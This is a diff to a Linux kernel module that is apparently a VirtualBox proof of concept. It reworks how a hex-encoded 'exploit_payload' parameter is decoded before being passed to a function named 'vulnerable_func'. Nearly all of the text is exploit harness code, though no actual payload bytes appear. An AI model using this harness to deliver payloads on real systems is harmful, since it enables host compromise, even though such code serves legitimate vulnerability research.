@@ -18,11 +18,9 @@ MODULE_AUTHOR("John Andersen, Fredric Carl");
 #endif
 
 static int exploit_length = 0;
-static int  exploit_payload[1000];
-static char exploit_prep[1000];
-static int arr_argc = 0;
+static char *exploit_payload = "blah";
 
-module_param_array(exploit_payload, int, &arr_argc, 0000);
+module_param(exploit_payload, charp, 0000);
 MODULE_PARM_DESC(exploit_payload, "Exploit payload");
 module_param(exploit_length, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
 MODULE_PARM_DESC(exploit_length, "Length of payload");
@@ -43,20 +41,24 @@ void vulnerable_func(const char * msg, ssize_t msg_size) {
 static int __init vbox_poc_init(void) {
   int i;
   int j;
+  int str_len;
   char buf[3] = {0, 0, 0};
+
   printk(INFO "Loaded\n");
 
-  // printk(INFO "Exploit payload: %s\n", exploit_payload);
-  printk(INFO "Payload length: %d\n", exploit_length);
-
-  for (i = 0, j = 0; i < 1000; i += 2, ++j) {
+  str_len = strlen(exploit_payload);
+  for (i = 0, j = 0; i < str_len; i += 2, ++j) {
 	buf[0] = exploit_payload[i];
 	buf[1] = exploit_payload[i + 1];
-    exploit_prep[j] = strtoull(buf, NULL, 16);
+    exploit_payload[j] = strtoull(buf, NULL, 16);
+	printk(INFO "exploit_payload[%d]: %02x\n", j, exploit_payload[j]);
   }
 
+  // printk(INFO "Exploit payload: %x\n", exploit_payload[exploit_length]);
+  printk(INFO "Payload length: %d\n", exploit_length);
+
   printk(INFO "Calling vulnerable_func\n");
-  vulnerable_func(exploit_prep, exploit_length);
+  vulnerable_func(exploit_payload, exploit_length);
   printk(INFO "Done with vulnerable_func\n");
 
   return 0;
